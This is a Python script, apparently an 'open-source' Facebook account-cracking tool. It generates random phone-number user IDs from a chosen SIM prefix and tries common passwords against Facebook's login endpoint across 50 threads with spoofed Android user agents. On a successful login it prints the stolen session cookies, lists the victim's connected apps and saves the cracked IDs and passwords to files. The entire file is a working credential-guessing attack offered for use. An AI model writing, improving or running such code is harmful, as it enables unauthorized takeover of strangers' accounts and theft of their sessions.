#open-source 
#code by > BaSir kh
#Test
#---------------------[IMPORT]---------------------#
from os import path
import os,base64,zlib,pip,urllib
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
###----------[ IMPORT LIBRARY ]---------- ###
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')

class jalan:
    
    def __init__(self, z):
        pass

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[*] %s \x1b[1;95m [ Your Active Apps ]     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[*] %s \x1b[1;95m [ Your Expired Apps ]    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\033[1;97m====================================================')           
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	exit(e)

logo ="""  \033[1;92m        ooooo   ooooo       .o   
`888'   `888'     .d88   
 888     888    .d'888   
 888ooooo888  .d'  888   
 888     888  88ooo888oo 
 888     888       888   
o888o   o888o     o888o  
                         
                         
                         
\033[1;93m0.6
\033[1;97m====================================================
\033[1;97m[+] AUTHOR   : SAJIB (PAPIYA MY EX🌚)
\033[1;97m[+] FACEBOOK : Sajib Ahmed 
\033[1;97m[+] TEAM     : H4
\033[1;97m[+] STATUS   : \033[1;95mOPEN-SOURCE
\033[1;97m===================================================="""


loop = 0
oks = []
cps = []
 
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
def main_menu():
    os.system('clear')
    jalan(logo)
    print('\x1b[1;37m[1] Random Crack')
    print('\x1b[1;37m[2] Tele Channel')
    print('\x1b[1;37m[0] \x1b[1;31mExit')
    print('\033[1;97m====================================================')
    basir = input('[~] Choose option : \033[1;92m')
    if basir == '1':
        afg()
    if basir == '2':
        os.system('xdg-open https://t.me/Afghan_Tech_001')
        main_menu()
    if basir == '0':
        exit()
        return None
    None('\x1b[1;37m[~] \x1b[1;32mTHANKS FOR USE')
    
    
try:
    print('\033[1;97m[~]\033[1;33m LOADING ASSET FILES... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\033[1;97m[~]\033[1;31m NO INTERNET CONNECTION... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def afg():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)    
    print('\033[1;97m[~] Sim code : \033[1;91m9378, 9379, 9377, 9370, 9374')
    print('\033[1;97m====================================================')
    code = input('[~] Put Code :\033[1;92m ')
    os.system("clear")
    print(logo)    
    limit = int(input('\033[1;97m[~] Cloning limit : \033[1;91m1000, 2000, 30000, 50000\n\033[1;97m====================================================\n\033[1;97m[~] Put Limit :\033[1;92m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    with ThreadPool(max_workers=50) as basir:
        clear()
        tl = str(len(user))
        print('\033[1;37m[~] TOTAL IDS :\033[1;32m '+tl)
        print('\033[1;37m[~] \033[1;33mTHE PROCESS HAS BEEN STARTED')
        print('\033[1;37m[~] \033[1;31mUSE AEROPLANE MOOD FOR SPEED UP')
        print('\033[1;97m====================================================')
        for love in user:
            uid = code+love
            pwx = [love,uid,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanistan','10002000','۱۰۰۲۰۰']
            basir.submit(rdm,uid,pwx,tl)
    print('\033[1;97m====================================================')
    print('\033[1;37m[~] CRACK PROCESS HAS BEEN COMPLETED ')
    print('\033[1;37m[~] IDS SAVED IN STECH OK.txt & CP.txt ')
    print('\033[1;97m====================================================')
    input('\033[1;37m[~] PRESS ENTER TO BACK MENU')
    main_menu()
 
def rdm(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'x.facebook.com',
            "method": 'GET',         
            "scheme": 'https',
            'authority': 'x.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
            'cache-control': 'max-age=0',
            'dpr': '2.8125',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'viewport-width': '980',
            "user-agent": pro}
            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[STECH-OK]  ' +uid+ ' | ' +ps+'  \n\033[1;37m[] COOKIE = \033[1;32m'+coki+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/STECH-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;31m[STECH-CP]  ' +uid+ ' | ' +ps+'  \33[0;97m')
                open('/sdcard/STECH-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[STECH] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
main_menu()